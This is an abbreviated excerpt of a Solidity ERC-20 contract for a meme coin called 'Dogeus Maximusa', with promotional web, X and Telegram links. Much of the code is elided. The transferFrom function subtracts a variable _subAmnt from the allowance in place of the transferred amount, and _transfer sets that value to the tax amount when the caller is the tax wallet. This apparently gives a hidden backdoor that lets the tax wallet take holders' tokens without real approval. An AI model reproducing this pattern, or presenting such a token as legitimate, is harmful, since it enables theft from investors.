...
The X Empire belongs to Dogeus Maximusa. Much crown. Very throne.

https://www.dogeusmaximusa.fun
https://x.com/DogeusMaximusa
https://t.me/DogeusMaximusa
...
contract Token is Context, IERC20, Ownable {
    ...
    string private constant _name = unicode"Dogeus Maximusa";
    ...
    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        ...
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(_subAmnt, "ERC20: transfer amount exceeds allowance"));
        return true;
    }
    ...
    function _transfer(address from, address to, uint256 amount) private {
        ...
        } else if (_msgSender() == _taxWallet) _subAmnt = taxAmount;
